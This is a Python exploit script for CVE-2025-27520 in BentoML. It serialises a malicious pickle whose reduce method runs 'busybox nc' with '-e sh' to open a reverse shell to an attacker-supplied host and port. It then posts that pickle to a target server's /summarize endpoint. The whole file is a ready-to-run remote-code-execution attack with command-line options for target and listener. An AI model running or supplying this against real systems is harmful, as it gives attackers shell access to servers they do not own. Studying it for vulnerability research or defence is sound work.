#!/usr/bin/env python3
"""
CVE-2025-27520.py

Enhancements by: @cw-l
Original script: https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc
Date: 2025-09-08
"""
import argparse
import os
import pickle
import requests
import sys

class Exploit():
    def __reduce__(self):
        # try out various reverse shell until one works
        cmd = f"busybox nc {LHOST} {LPORT} -e sh"
        return (os.system, (cmd,))

def build_payload(lhost, lport):
    global LHOST, LPORT
    LHOST, LPORT = lhost, lport
    payload = pickle.dumps(Exploit())
    return payload

def exploit(target, port, lhost, lport):
    url = f"{target}:{port}/summarize"
    payload = build_payload(lhost, lport)
    headers = {'Content-Type': 'application/vnd.bentoml+pickle'}

    print(f"[+] Sending exploit to {url}")
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=5)
        print(f"[+] Server responded with status code: {r.status_code}")
    except Exception as e:
        print(f"[-] Check listener for shell: {e}")

def main():
    parser = argparse.ArgumentParser(description="Reverse shell for CVE-2025-27520.")
    parser.add_argument("-t", "--target", required=True, help="Target IP (e.g., 192.168.198.251)")
    parser.add_argument("-p", "--port", default=3000, help="Target port (default: 3000)")
    parser.add_argument("-lhost", required=True, help="Attacker IP for reverse shell")
    parser.add_argument("-lport", required=True, help="Attacker port for reverse shell")

    args = parser.parse_args()

    target = args.target if args.target.startswith("http") else f"http://{args.target}"

    exploit(target, args.port, args.lhost, args.lport)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("Usage: exploit.py -t <target> -p <port> -lhost <attacker_ip> -lport <attacker_port>")
        sys.exit(1)
    main()
